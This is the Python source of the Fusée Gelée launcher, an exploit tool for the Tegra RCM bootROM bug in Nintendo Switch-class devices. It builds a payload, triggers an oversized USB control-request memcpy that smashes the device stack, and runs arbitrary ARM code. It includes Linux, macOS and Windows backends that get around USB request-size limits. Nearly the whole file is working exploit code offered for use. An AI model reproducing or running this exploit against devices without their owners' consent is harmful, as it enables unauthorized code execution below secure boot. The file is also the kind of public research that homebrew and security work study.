#!/usr/bin/env python3
#
# fusée gelée
#
# Launcher for the {re}switched coldboot/bootrom hacks--
# launches payloads above the Horizon
#
# discovery and implementation by @ktemkin
# likely independently discovered by lots of others <3
#
# this code is political -- it stands with those who fight for LGBT rights
# don't like it? suck it up, or find your own damned exploit ^-^
#
# special thanks to:
#    ScirèsM, motezazer -- guidance and support
#    hedgeberg, andeor  -- dumping the Jetson bootROM
#    TuxSH              -- for IDB notes that were nice to peek at
#
# much love to:
#    Aurora Wright, Qyriad, f916253, MassExplosion213, and Levi
#
# greetings to:
#    shuffle2

# This file is part of Fusée Launcher
# Copyright (C) 2018 Mikaela Szekely <qyriad@gmail.com>
# Copyright (C) 2018 Kate Temkin <k@ktemkin.com>
# Fusée Launcher is licensed under the terms of the GNU GPLv2

import os
import sys
import errno
import ctypes
import argparse
import platform
import binascii
import struct

USB_XFER_MAX = 0x1000

RCM_V1_HEADER_SIZE = 116
RCM_V35_HEADER_SIZE = 628
RCM_V40_HEADER_SIZE = 644
RCM_V4P_HEADER_SIZE = 680


# The address where the RCM payload is placed.
# This is fixed for most device.
RCM_PAYLOAD_ADDR    = 0x4000A000

# The address where the user payload is expected to begin.
PAYLOAD_START_ADDR  = 0x4000AE40

# Specify the range of addresses where we should inject our
# payload address.
STACK_SPRAY_START   = 0x4000EE40
STACK_SPRAY_END     = 0x40011000

class RCMError(Exception):
    def __init__(self, rcm_error_code):
        msg = "RCM error 0x{:08x}".format(rcm_error_code)
        super().__init__(msg)
        self.rcm_error_code = rcm_error_code

# notes:
# GET_CONFIGURATION to the DEVICE triggers memcpy from 0x40003982
# GET_INTERFACE  to the INTERFACE triggers memcpy from 0x40003984
# GET_STATUS     to the ENDPOINT  triggers memcpy from <on the stack>

class HaxBackend:
    """
    Base class for backends for the TegraRCM vuln.
    """

    # USB constants used
    STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT = 0x82
    STANDARD_REQUEST_DEVICE_TO_HOST   = 0x80
    GET_DESCRIPTOR    = 0x6
    GET_CONFIGURATION = 0x8

    # Interface requests
    GET_STATUS        = 0x0

    # List of OSs this class supports.
    SUPPORTED_SYSTEMS = []

    def __init__(self, skip_checks=False):
        """ Sets up the backend for the given device. """
        self.skip_checks = skip_checks


    def print_warnings(self):
        """ Print any warnings necessary for the given backend. """
        pass


    def trigger_vulnerability(self, length):
        """
        Triggers the actual controlled memcpy.
        The actual trigger needs to be executed carefully, as different host OSs
        require us to ask for our invalid control request differently.
        """
        raise NotImplementedError("Trying to use an abstract backend rather than an instance of the proper subclass!")


    @classmethod
    def supported(cls, system_override=None):
        """ Returns true iff the given backend is supported on this platform. """

        # If we have a SYSTEM_OVERRIDE, use it.
        if system_override:
            system = system_override
        else:
            system = platform.system()

        return system in cls.SUPPORTED_SYSTEMS


    @classmethod
    def create_appropriate_backend(cls, system_override=None, skip_checks=False):
        """ Creates a backend object appropriate for the current OS. """

        # Search for a supportive backend, and try to create one.
        for subclass in cls.__subclasses__():
            if subclass.supported(system_override):
                return subclass(skip_checks=skip_checks)

        # ... if we couldn't, bail out.
        raise IOError("No backend to trigger the vulnerability-- it's likely we don't support your OS!")


    def read(self, length):
        """ Reads data from the RCM protocol endpoint. """
        return bytes(self.dev.read(0x81, length, 3000))


    def read_ep0(self, length):

        # Triggering the vulnerability is simplest on macOS; we simply issue the control request as-is.
        return bytes(self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, self.GET_STATUS, 0, 0, length))

    def write_single_buffer(self, data):
        """
        Writes a single RCM buffer, which should be USB_XFER_MAX long.
        The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
        If it's not, send a ZLP.
        """
        return self.dev.write(0x01, data, 3000)


    def find_device(self, vid=None, pid=None):
        """ Set and return the device to be used """

        # os.environ['PYUSB_DEBUG'] = 'debug'
        os.environ['PYUSB_DEBUG'] = 'info'
        import usb

        self.dev = usb.core.find(idVendor=vid, idProduct=pid)
        return self.dev


class MacOSBackend(HaxBackend):
    """
    Simple vulnerability trigger for macOS: we simply ask libusb to issue
    the broken control request, and it'll do it for us. :)

    We also support platforms with a hacked libusb and FreeBSD.
    """

    BACKEND_NAME = "macOS"
    SUPPORTED_SYSTEMS = ['Darwin', 'libusbhax', 'macos', 'FreeBSD']

    def trigger_vulnerability(self, length):

        # Triggering the vulnerability is simplest on macOS; we simply issue the control request as-is.
        r = self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, self.GET_STATUS, 0, 0, length)
        return bytes(r)



class LinuxBackend(HaxBackend):
    """
    More complex vulnerability trigger for Linux: we can't go through libusb,
    as it limits control requests to a single page size, the limitation expressed
    by the usbfs. More realistically, the usbfs seems fine with it, and we just
    need to work around libusb.
    """

    BACKEND_NAME = "Linux"
    SUPPORTED_SYSTEMS = ['Linux', 'linux']
    SUPPORTED_USB_CONTROLLERS = ['pci/drivers/xhci_hcd', 'platform/drivers/dwc_otg']

    SETUP_PACKET_SIZE = 8

    IOCTL_IOR   = 0x80000000
    IOCTL_TYPE  = ord('U')
    IOCTL_NR_SUBMIT_URB = 10

    URB_CONTROL_REQUEST = 2

    class SubmitURBIoctl(ctypes.Structure):
        _fields_ = [
            ('type',          ctypes.c_ubyte),
            ('endpoint',      ctypes.c_ubyte),
            ('status',        ctypes.c_int),
            ('flags',         ctypes.c_uint),
            ('buffer',        ctypes.c_void_p),
            ('buffer_length', ctypes.c_int),
            ('actual_length', ctypes.c_int),
            ('start_frame',   ctypes.c_int),
            ('stream_id',     ctypes.c_uint),
            ('error_count',   ctypes.c_int),
            ('signr',         ctypes.c_uint),
            ('usercontext',   ctypes.c_void_p),
        ]


    def print_warnings(self):
        """ Print any warnings necessary for the given backend. """
        print("\nImportant note: on desktop Linux systems, we currently require an XHCI host controller.")
        print("A good way to ensure you're likely using an XHCI backend is to plug your")
        print("device into a blue 'USB 3' port.\n")


    def trigger_vulnerability(self, length):
        """
        Submit the control request directly using the USBFS submit_urb
        ioctl, which issues the control request directly. This allows us
        to send our giant control request despite size limitations.
        """

        import os
        import fcntl

        # We only work for devices that are bound to a compatible HCD.
        self._validate_environment()

        # Figure out the USB device file we're going to use to issue the
        # control request.
        fd = os.open('/dev/bus/usb/{:0>3d}/{:0>3d}'.format(self.dev.bus, self.dev.address), os.O_RDWR)

        # Define the setup packet to be submitted.
        setup_packet = \
            int.to_bytes(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, 1, byteorder='little') + \
            int.to_bytes(self.GET_STATUS,                                  1, byteorder='little') + \
            int.to_bytes(0,                                                2, byteorder='little') + \
            int.to_bytes(0,                                                2, byteorder='little') + \
            int.to_bytes(length,                                           2, byteorder='little')

        # Create a buffer to hold the result.
        buffer_size = self.SETUP_PACKET_SIZE + length
        buffer = ctypes.create_string_buffer(setup_packet, buffer_size)

        # Define the data structure used to issue the control request URB.
        request = self.SubmitURBIoctl()
        request.type          = self.URB_CONTROL_REQUEST
        request.endpoint      = 0
        request.buffer        = ctypes.addressof(buffer)
        request.buffer_length = buffer_size

        # Manually submit an URB to the kernel, so it issues our 'evil' control request.
        ioctl_number = (self.IOCTL_IOR | ctypes.sizeof(request) << 16 | ord('U') << 8 | self.IOCTL_NR_SUBMIT_URB)
        fcntl.ioctl(fd, ioctl_number, request, True)

        # Close our newly created fd.
        os.close(fd)

        # The other modules raise an IOError when the control request fails to complete. We don't fail out (as we don't bother
        # reading back), so we'll simulate the same behavior as the others.
        raise IOError("Raising an error to match the others!")


    def _validate_environment(self):
        """
        We can only inject giant control requests on devices that are backed
        by certain usb controllers-- typically, the xhci_hcd on most PCs.
        """

        from glob import glob

        # If we're overriding checks, never fail out.
        if self.skip_checks:
            print("skipping checks")
            return

        # Search each device bound to the xhci_hcd driver for the active device...
        for hci_name in self.SUPPORTED_USB_CONTROLLERS:
            for path in glob("/sys/bus/{}/*/usb*".format(hci_name)):
                if self._node_matches_our_device(path):
                    return

        raise ValueError("This device needs to be on a supported backend. Usually that means plugged into a blue/USB 3.0 port!\nBailing out.")


    def _node_matches_our_device(self, path):
        """
        Checks to see if the given sysfs node matches our given device.
        Can be used to check if an xhci_hcd controller subnode reflects a given device.,
        """

        # If this isn't a valid USB device node, it's not what we're looking for.
        if not os.path.isfile(path + "/busnum"):
            return False

        # We assume that a whole _bus_ is associated with a host controller driver, so we
        # only check for a matching bus ID.
        if self.dev.bus != self._read_num_file(path + "/busnum"):
            return False

        # If all of our checks passed, this is our device.
        return True


    def _read_num_file(self, path):
        """
        Reads a numeric value from a sysfs file that contains only a number.
        """

        with open(path, 'r') as f:
            raw = f.read()
            return int(raw)

class WindowsBackend(HaxBackend):
    """
    Use libusbK for most of it, and use the handle libusbK gets for us to call kernel32's DeviceIoControl
    """

    BACKEND_NAME = "Windows"
    SUPPORTED_SYSTEMS = ["Windows"]

    # Windows and libusbK specific constants
    WINDOWS_FILE_DEVICE_UNKNOWN = 0x00000022
    LIBUSBK_FUNCTION_CODE_GET_STATUS = 0x807
    WINDOWS_METHOD_BUFFERED = 0
    WINDOWS_FILE_ANY_ACCESS = 0

    RAW_REQUEST_STRUCT_SIZE = 24 # 24 is how big the struct is, just trust me
    TO_ENDPOINT = 2

    # Yoinked (with love) from Windows' CTL_CODE macro
    def win_ctrl_code(self, DeviceType, Function, Method, Access):
        """ Return a control code for use with DeviceIoControl() """
        return ((DeviceType) << 16 | ((Access) << 14) | ((Function)) << 2 | (Method))

    def __init__(self, skip_checks):
        import libusbK
        self.libk = libusbK
        # Grab libusbK
        self.lib = ctypes.cdll.libusbK


    def find_device(self, Vid, Pid):
        """
        Windows version of this function
        Its return isn't actually significant, but it needs to be not None
        """

        # Get a list of devices to use later
        device_list = self.libk.KLST_HANDLE()
        device_info = ctypes.pointer(self.libk.KLST_DEV_INFO())
        ret = self.lib.LstK_Init(ctypes.byref(device_list), 0)

        if ret == 0:
            raise ctypes.WinError()

        # Get info for a device with that vendor ID and product ID
        device_info = ctypes.pointer(self.libk.KLST_DEV_INFO())
        ret = self.lib.LstK_FindByVidPid(device_list, Vid, Pid, ctypes.byref(device_info))
        self.lib.LstK_Free(ctypes.byref(device_list))
        if device_info is None or ret == 0:
            return None

        # Populate function pointers for use with the driver our device uses (which should be libusbK)
        self.dev = self.libk.KUSB_DRIVER_API()
        ret = self.lib.LibK_LoadDriverAPI(ctypes.byref(self.dev), device_info.contents.DriverID)
        if ret == 0:
            raise ctypes.WinError()

        # Initialize the driver for use with our device
        self.handle = self.libk.KUSB_HANDLE(None)
        ret = self.dev.Init(ctypes.byref(self.handle), device_info)
        if ret == 0:
            raise self.libk.WinError()

        return self.dev


    def read(self, length):
        """ Read using libusbK """
        # Create the buffer to store what we read
        buffer = ctypes.create_string_buffer(length)

        len_transferred = ctypes.c_uint(0)

        # Call libusbK's ReadPipe using our specially-crafted function pointer and the opaque device handle
        ret = self.dev.ReadPipe(self.handle, ctypes.c_ubyte(0x81), ctypes.addressof(buffer), ctypes.c_uint(length), ctypes.byref(len_transferred), None)

        if ret == 0:
            raise ctypes.WinError()

        return buffer.raw

    def write_single_buffer(self, data):
        """ Write using libusbK """
        # Copy construct to a bytearray so we Know™ what type it is
        buffer = bytearray(data)

        # Convert wrap the data for use with ctypes
        cbuffer = (ctypes.c_ubyte * len(buffer))(*buffer)

        len_transferred = ctypes.c_uint(0)

        # Call libusbK's WritePipe using our specially-crafted function pointer and the opaque device handle
        ret = self.dev.WritePipe(self.handle, ctypes.c_ubyte(0x01), cbuffer, len(data), ctypes.byref(len_transferred), None)
        if ret == 0:
            raise ctypes.WinError()

    def ioctl(self, driver_handle: ctypes.c_void_p, ioctl_code: ctypes.c_ulong, input_bytes: ctypes.c_void_p, input_bytes_count: ctypes.c_size_t, output_bytes: ctypes.c_void_p, output_bytes_count: ctypes.c_size_t):
        """ Wrapper for DeviceIoControl """
        overlapped = self.libk.OVERLAPPED()
        ctypes.memset(ctypes.addressof(overlapped), 0, ctypes.sizeof(overlapped))

        ret = ctypes.windll.kernel32.DeviceIoControl(driver_handle, ioctl_code, input_bytes, input_bytes_count, output_bytes, output_bytes_count, None, ctypes.byref(overlapped))

        # We expect this to error, which matches the others ^_^
        if ret == False:
            raise ctypes.WinError()

    def trigger_vulnerability(self, length):
        """
        Go over libusbK's head and get the master handle it's been using internally
        and perform a direct DeviceIoControl call to the kernel to skip the length check
        """
        # self.handle is KUSB_HANDLE, cast to KUSB_HANDLE_INTERNAL to transparent-ize it
        internal = ctypes.cast(self.handle, ctypes.POINTER(self.libk.KUSB_HANDLE_INTERNAL))

        # Get the handle libusbK has been secretly using in its ioctl calls this whole time
        master_handle = internal.contents.Device.contents.MasterDeviceHandle

        if master_handle is None or master_handle == self.libk.INVALID_HANDLE_VALUE:
            raise ValueError("Failed to initialize master handle")

        # the raw request struct is pretty annoying, so I'm just going to allocate enough memory and set the few fields I need
        raw_request = ctypes.create_string_buffer(self.RAW_REQUEST_STRUCT_SIZE)

        # set timeout to 1000 ms, timeout offset is 0 (since it's the first member), and it's an unsigned int
        timeout_p = ctypes.cast(raw_request, ctypes.POINTER(ctypes.c_uint))
        timeout_p.contents = ctypes.c_ulong(1000) # milliseconds

        status_p = ctypes.cast(ctypes.byref(raw_request, 4), ctypes.POINTER(self.libk.status_t))
        status_p.contents.index = self.GET_STATUS
        status_p.contents.recipient = self.TO_ENDPOINT

        buffer = ctypes.create_string_buffer(length)

        code = self.win_ctrl_code(self.WINDOWS_FILE_DEVICE_UNKNOWN, self.LIBUSBK_FUNCTION_CODE_GET_STATUS, self.WINDOWS_METHOD_BUFFERED, self.WINDOWS_FILE_ANY_ACCESS)
        ret = self.ioctl(master_handle, ctypes.c_ulong(code), raw_request, ctypes.c_size_t(24), buffer, ctypes.c_size_t(length))

        if ret == False:
            raise ctypes.WinError()


class RCMHax:

    # Default to the T30 RCM VID and PID.
    DEFAULT_VID = 0x0955
    DEFAULT_PID = 0x7330

    # Exploit specifics
    COPY_BUFFER_ADDRESSES   = [0x40003000, 0x40005000]   # The addresses of the DMA buffers we can trigger a copy _from_.
    STACK_END               = 0x4000A000                 # The address just after the end of the device's stack.

    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
        """ Set up our RCM hack connection."""

        # The first write into the bootROM touches the lowbuffer.
        self.current_buffer = 0

        # Keep track of the total amount written.
        self.total_written = 0

        # Create a vulnerability backend for the given device.
        try:
            self.backend = HaxBackend.create_appropriate_backend(system_override=os_override, skip_checks=override_checks)
        except IOError:
            print("It doesn't look like we support your OS, currently. Sorry about that!\n")
            sys.exit(-1)

        # Grab a connection to the USB device itself.
        self.dev = self._find_device(vid, pid)
        # self.dev = "lol"

        self.overwrite_len = None
        self.EndpointStatus_stack_addr = None
        self.ProcessSetupPacket_SP = None
        self.InnerMemcpy_LR_stack_addr = None

        # If we don't have a device...
        if self.dev is None:

            # ... and we're allowed to wait for one, wait indefinitely for one to appear...
            if wait_for_device:
                print("Waiting for a TegraRCM device to come online...")
                while self.dev is None:
                    self.dev = self._find_device(vid, pid)

            # ... or bail out.
            else:
                raise IOError("No TegraRCM device found?")

        # Print any use-related warnings.
        self.backend.print_warnings()

        # Notify the user of which backend we're using.
        print("Identified a {} system; setting up the appropriate backend.".format(self.backend.BACKEND_NAME))


    def _find_device(self, vid=None, pid=None):
        """ Attempts to get a connection to the RCM device with the given VID and PID. """

        # Apply our default VID and PID if neither are provided...
        vid = vid if vid else self.DEFAULT_VID
        pid = pid if pid else self.DEFAULT_PID

        # ... and use them to find a USB device.
        return self.backend.find_device(vid, pid)

    def read(self, length):
        """ Reads data from the RCM protocol endpoint. """
        return self.backend.read(length)


    def write(self, data):
        """ Writes data to the main RCM protocol endpoint. """

        length = len(data)
        print("txing {} bytes total".format(length))
        packet_size = USB_XFER_MAX
        length_sent = 0

        while length:
            data_to_transmit = min(length, packet_size)
            print("txing {} bytes ({} already sent) to buf[{}] 0x{:08x}".format(data_to_transmit, length_sent, self.current_buffer, self.get_current_buffer_address()))
            length -= data_to_transmit

            chunk = data[:data_to_transmit]
            data  = data[data_to_transmit:]
            self.write_single_buffer(chunk)
            length_sent += data_to_transmit


    def write_single_buffer(self, data):
        """
        Writes a single RCM buffer, which should be USB_XFER_MAX long.
        The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
        If it's not, send a ZLP.
        """
        self._toggle_buffer()
        try:
            return self.backend.write_single_buffer(data)
        except Exception as err:
            print("USBError: {}".format(err))
            rcm_err = self.read(4)
            # print("RCM error buf: {}".format(rcm_err))
            # rcm_err_int = ctypes.c_uint32.from_buffer_copy(rcm_err).value
            rcm_err_int = struct.unpack('>I', rcm_err)
            # print("RCM error buf: 0x{:08x}".format(rcm_err_int))
            raise RCMError(rcm_err_int)

    def _toggle_buffer(self):
        """
        Toggles the active target buffer, paralleling the operation happening in
        RCM on the X1 device.
        """
        self.current_buffer = 1 - self.current_buffer


    def get_current_buffer_address(self):
        """ Returns the base address for the current copy. """
        return self.COPY_BUFFER_ADDRESSES[self.current_buffer]


    def read_device_id(self):
        """ Reads the Device ID via RCM. Only valid at the start of the communication. """
        return self.read(16)

    def read_stack(self):
        return self.backend.read_ep0(0x10)

    def get_overwrite_length(self):
        # overwrite_len = 0x00004f20
        if self.overwrite_len is None:
            stack_snapshot = self.read_stack()
            print("Stack snapshot: {}".format(binascii.hexlify(stack_snapshot)))
            self.EndpointStatus_stack_addr = struct.unpack('<I', stack_snapshot[0xC:0xC+4])[0]
            print("EndpointStatus_stack_addr: 0x{:08x}".format(self.EndpointStatus_stack_addr))
            self.ProcessSetupPacket_SP = self.EndpointStatus_stack_addr - 0xC
            print("ProcessSetupPacket SP: 0x{:08x}".format(self.ProcessSetupPacket_SP))
            self.InnerMemcpy_LR_stack_addr = self.ProcessSetupPacket_SP - 2 * 4 - 2 * 4
            print("InnerMemcpy LR stack addr: 0x{:08x}".format(self.InnerMemcpy_LR_stack_addr))
            self.overwrite_len = self.InnerMemcpy_LR_stack_addr - self.COPY_BUFFER_ADDRESSES[1]
            print("overwrite_len: 0x{:08x}".format(self.overwrite_len))
        return self.overwrite_len

    def switch_to_highbuf(self):
        """ Switches to the higher RCM buffer, reducing the amount that needs to be copied. """

        if self.get_current_buffer_address() != self.COPY_BUFFER_ADDRESSES[1]:
            self.write(b'\0' * USB_XFER_MAX)


    def trigger_controlled_memcpy(self, length=None):
        """ Triggers the RCM vulnerability, causing it to make a signficantly-oversized memcpy. """

        # Determine how much we'd need to transmit to smash the full stack.
        if length is None:
            # length = self.STACK_END - self.get_current_buffer_address()
            length = self.get_overwrite_length()

        print("sending status request with length 0x{:08x}".format(length))

        return self.backend.trigger_vulnerability(length)

    def get_overwite_payload_off(self, intermezzo_size):
        overwrite_len = self.get_overwrite_length()
        overall_payload_overwrite_len = overwrite_len - (RCM_PAYLOAD_ADDR - self.EndpointStatus_stack_addr)
        overwrite_payload_off = overall_payload_overwrite_len - intermezzo_size - 4
        return overwrite_payload_off

    def get_payload_first_length(self, intermezzo_size, payload_length):
        overwrite_payload_off = self.get_overwite_payload_off(intermezzo_size)
        print("overwrite_payload_off: 0x{:08x}".format(overwrite_payload_off))
        return min(payload_length, overwrite_payload_off)

    def get_payload_second_length(self, intermezzo_size, payload_length):
        return max(0, payload_length - self.get_payload_first_length(intermezzo_size, payload_length))

    def get_patched_intermezzo(self, intermezzo_bin, payload_length):
        overwrite_len = self.get_overwrite_length()
        intermezzo_start_addr_magic = struct.pack('<I', 0x50004000)
        intermezzo_start_addr_off = intermezzo_bin.find(intermezzo_start_addr_magic)
        intermezzo_start_addr = RCM_PAYLOAD_ADDR
        intermezzo_reloc_addr = self.COPY_BUFFER_ADDRESSES[0]
        payload_first_length = self.get_payload_first_length(len(intermezzo_bin), payload_length)
        print("payload_first_length: 0x{:08x}".format(payload_first_length))
        payload_second_length = self.get_payload_second_length(len(intermezzo_bin), payload_length)
        print("payload_second_length: 0x{:08x}".format(payload_second_length))

        patched_vals = struct.pack('<IIII',
            intermezzo_start_addr, intermezzo_reloc_addr,
            payload_first_length, payload_second_length)

        print(binascii.hexlify(patched_vals))
        patched_intermezzo_bin = intermezzo_bin[:intermezzo_start_addr_off] + patched_vals + intermezzo_bin[intermezzo_start_addr_off + len(patched_vals):]

        return patched_intermezzo_bin



def parse_usb_id(id):
    """ Quick function to parse VID/PID arguments. """
    return int(id, 16)

# Read our arguments.
parser = argparse.ArgumentParser(description='launcher for the fusee gelee exploit (by @ktemkin)')
parser.add_argument('payload', metavar='payload', type=str, help='ARM payload to be launched; should be linked at 0x40010000')
parser.add_argument('-w', dest='wait', action='store_true', help='wait for an RCM connection if one isn\'t present')
parser.add_argument('-V', metavar='vendor_id', dest='vid', type=parse_usb_id, default=None, help='overrides the TegraRCM vendor ID')
parser.add_argument('-P', metavar='product_id', dest='pid', type=parse_usb_id, default=None, help='overrides the TegraRCM product ID')
parser.add_argument('--override-os', metavar='platform', dest='platform', type=str, default=None, help='overrides the detected OS; for advanced users only')
parser.add_argument('--relocator', metavar='binary', dest='relocator', type=str, default="%s/intermezzo.bin" % os.path.dirname(os.path.abspath(__file__)), help='provides the path to the intermezzo relocation stub')
parser.add_argument('--override-checks', dest='skip_checks', action='store_true', help="don't check for a supported controller; useful if you've patched your EHCI driver")
parser.add_argument('--allow-failed-id', dest='permissive_id', action='store_true', help="continue even if reading the device's ID fails; useful for development but not for end users")
parser.add_argument('--tty', dest='tty_mode', action='store_true', help="Enable TTY mode after payload launch")
arguments = parser.parse_args()

# Expand out the payload path to handle any user-refrences.
payload_path = os.path.expanduser(arguments.payload)
if not os.path.isfile(payload_path):
    print("Invalid payload path specified!")
    sys.exit(-1)

# Find our intermezzo relocator...
intermezzo_path = os.path.expanduser(arguments.relocator)
if not os.path.isfile(intermezzo_path):
    print("Could not find the intermezzo interposer. Did you build it?")
    sys.exit(-1)

# Get a connection to our device.
try:
    switch = RCMHax(wait_for_device=arguments.wait, vid=arguments.vid, 
            pid=arguments.pid, os_override=arguments.platform, override_checks=arguments.skip_checks)
except IOError as e:
    print(e)
    sys.exit(-1)

intermezzo = None
intermezzo_size = None
with open(intermezzo_path, "rb") as f:
    intermezzo = f.read()
intermezzo_size = len(intermezzo)
print("intermezzo_size: 0x{:08x}".format(intermezzo_size))
target_payload = None
target_payload_size = None
with open(payload_path, "rb") as f:
    target_payload = f.read()
target_payload_size = len(target_payload)
print("target_payload_size: 0x{:08x}".format(target_payload_size))

# Print the device's ID. Note that reading the device's ID is necessary to get it into
try:
    device_id = switch.read_device_id()
    # device_id = b'0000'
    print("Found a Tegra with Device ID: {}".format(binascii.hexlify(device_id)))
except OSError as e:
    # Raise the exception only if we're not being permissive about ID reads.
    if not arguments.permissive_id:
        raise e

patched_intermezzo = switch.get_patched_intermezzo(intermezzo, target_payload_size)
with open("intermezzo_patched.bin", "wb") as f:
    f.write(patched_intermezzo)
# sys.exit(0)

# Prefix the image with an RCM command, so it winds up loaded into memory
# at the right location (0x40010000).

RCM_HEADER_SIZE = RCM_V1_HEADER_SIZE

# Use the maximum length accepted by RCM, so we can transmit as much payload as
# we want; we'll take over before we get to the end.
length  = 0x30000 + RCM_HEADER_SIZE - 0x10
payload = length.to_bytes(4, byteorder='little')
print("Setting rcm msg size to 0x{:08x}".format(length))
print("RCM payload (len_insecure): {}".format(binascii.hexlify(payload)))

# pad out to RCM_HEADER_SIZE so the payload starts at the right address in IRAM
payload += b'\0' * (RCM_HEADER_SIZE - len(payload))

# Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
# We'll use this data to smash the stack when we execute the vulnerable memcpy.
print("\nSetting ourselves up to smash the stack...")

print("Payload offset of intermezzo: 0x{:08x}".format(len(payload)))

# Include the Intermezzo binary in the command stream. This is our first-stage
# payload, and it's responsible for relocating the final payload to 0x40010000.
payload += patched_intermezzo
payload_first_length = switch.get_payload_first_length(intermezzo_size, target_payload_size)
payload += target_payload[:payload_first_length]


overwrite_len = switch.get_overwrite_length()
print("overwrite_len: 0x{:08x}".format(overwrite_len))
payload_overwrite_len = overwrite_len - (RCM_PAYLOAD_ADDR - switch.EndpointStatus_stack_addr)
print("payload_overwrite_len: 0x{:08x}".format(payload_overwrite_len))

overwrite_payload_off = switch.get_overwite_payload_off(intermezzo_size)
print("overwrite_payload_off: 0x{:08x}".format(overwrite_payload_off))
smash_padding = 0
if payload_first_length < overwrite_payload_off:
    smash_padding = overwrite_payload_off - payload_first_length
print("smash_padding: 0x{:08x}".format(smash_padding))
payload += b'\0' * smash_padding

payload += RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little')

# overwrite_payload_off = switch.get_overwite_payload_off(intermezzo_size)
# smash_padding = 0
# if payload_first_length < overwrite_payload_off:
#     smash_padding = overwrite_payload_off - payload_first_length - 0x100
# print("smash_padding: 0x{:08x}".format(smash_padding))
# payload += b'\0' * smash_padding

# payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * 0x4000)

payload_second_length = switch.get_payload_second_length(intermezzo_size, target_payload_size)

if payload_second_length > 0:
    payload += target_payload[payload_first_length:]

# Pad the payload to fill a USB request exactly, so we don't send a short
# packet and break out of the RCM loop.
payload_length = len(payload)
padding_size   = USB_XFER_MAX - (payload_length % USB_XFER_MAX)
payload += (b'\0' * padding_size)

with open("payload.bin", "wb") as f:
    f.write(payload)
with open("payload_no_header.bin", "wb") as f:
    f.write(payload[RCM_HEADER_SIZE:])

# Check to see if our payload packet will fit inside the RCM high buffer.
# If it won't, error out.
if len(payload) > length:
    size_over = len(payload) - length
    print("ERROR: Payload is too large to be submitted via RCM. ({} bytes larger than max).".format(size_over))
    sys.exit(errno.EFBIG)

# sys.exit(0)

# Send the constructed payload, which contains the command, the stack smashing
# values, the Intermezzo relocation stub, and the final payload.
print("Uploading payload...")
switch.write(payload)

# The RCM backend alternates between two different DMA buffers. Ensure we're
# about to DMA into the higher one, so we have less to copy during our attack.
switch.switch_to_highbuf()

# Smash the device's stack, triggering the vulnerability.
print("Smashing the stack...")
try:
    switch.trigger_controlled_memcpy()
except ValueError as e:
    print(str(e))
except IOError:
    print("The USB device stopped responding-- sure smells like we've smashed its stack. :)")
    print("Launch complete!")

if arguments.tty_mode:
    while True:
        buf = switch.read(USB_XFER_MAX)
        print(binascii.hexlify(buf))
        try:
            print(buf.decode('utf-8'))
        except UnicodeDecodeError:
            pass
